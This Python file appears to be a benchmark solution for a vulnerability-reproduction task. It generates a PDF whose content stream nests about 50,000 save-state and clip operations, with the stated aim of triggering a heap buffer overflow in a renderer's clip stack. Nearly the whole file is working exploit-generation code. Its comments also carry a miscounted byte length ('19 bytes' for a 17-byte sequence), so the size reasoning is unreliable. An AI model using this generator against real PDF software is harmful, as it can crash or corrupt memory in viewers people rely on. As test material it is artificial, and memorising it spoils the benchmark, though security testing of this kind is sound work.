import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in the clip stack.
        The vulnerability allows the nesting depth to step outside the layer/clip stack
        when pushing a clip mark.
        
        The ground truth size (~913KB) suggests a linear expansion of commands in a format
        that doesn't support tight loops for this operation (like PDF content streams) or
        where the vulnerability is specific to the parser's linear processing.
        
        We construct a valid PDF with a content stream containing approximately 50,000
        nested clip operations.
        """
        
        # Number of nested operations.
        # "q 0 0 1 1 re W n " is 19 bytes.
        # 50,000 * 19 = 950,000 bytes, which is close to the ground truth of 913,919 bytes.
        # This depth should be sufficient to overflow typical stack/buffer limits (e.g., 65536).
        num_ops = 50000
        
        # PDF Header
        header = b"%PDF-1.4\n"
        
        # Object 1: Catalog
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # Object 2: Pages
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Object 3: Page
        # Links to Content Stream (Obj 4)
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R >>\nendobj\n"
        
        # Object 4: Content Stream
        # The payload repeats the sequence:
        # q  : Save graphics state (pushes to state stack)
        # 0 0 1 1 re : Append a 1x1 rectangle at (0,0) to the path
        # W  : Clip (intersect current clip with path)
        # n  : End path (no stroke/fill)
        # This sequence effectively pushes a new complex clip path onto the stack repeatedly.
        op_sequence = b"q 0 0 1 1 re W n "
        stream_data = op_sequence * num_ops
        
        obj4_start = b"4 0 obj\n<< /Length " + str(len(stream_data)).encode() + b" >>\nstream\n"
        obj4_end = b"\nendstream\nendobj\n"
        obj4 = obj4_start + stream_data + obj4_end
        
        # Construct body to calculate offsets
        body = header + obj1 + obj2 + obj3 + obj4
        
        # Cross-reference table
        xref_offset = len(body)
        xref = b"xref\n0 5\n0000000000 65535 f \n"
        
        # Calculate object offsets
        off1 = len(header)
        off2 = off1 + len(obj1)
        off3 = off2 + len(obj2)
        off4 = off3 + len(obj3)
        
        # Format offsets as 10-digit integers
        xref += b"%010d 00000 n \n" % off1
        xref += b"%010d 00000 n \n" % off2
        xref += b"%010d 00000 n \n" % off3
        xref += b"%010d 00000 n \n" % off4
        
        # Trailer
        trailer = b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n%d\n%%EOF" % xref_offset
        
        return body + xref + trailer